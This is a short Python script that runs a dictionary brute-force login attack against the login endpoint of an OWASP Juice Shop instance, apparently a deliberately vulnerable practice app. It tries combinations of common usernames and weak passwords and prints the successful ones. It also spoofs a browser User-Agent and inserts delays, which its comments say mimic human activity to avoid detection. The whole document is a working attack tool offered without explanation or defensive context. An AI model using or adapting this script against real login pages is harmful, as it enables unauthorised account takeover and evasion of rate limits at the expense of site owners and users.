import requests
import time

url = "https://juice-shop.herokuapp.com/rest/user/login"

users = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

with requests.Session() as session:
    session.headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123"}

    for user in users:
        for password in passwords:
            data = {"email": user, "password": password}

            try:
                response = session.post(url, json=data)
        
                if response.status_code == 200:
                    print(f"Login successful with user: {user} and password: {password}")
                    # Add a delay to mimic human-like activity
                    time.sleep(1)
                else:
                    print(f"Failed login attempt with user: {user} and password: {password}")
                    # Add a delay after failed login attempts
                    time.sleep(0.5)
            except requests.exceptions.RequestException as e:
                print(f"Exception occurred: {e}")
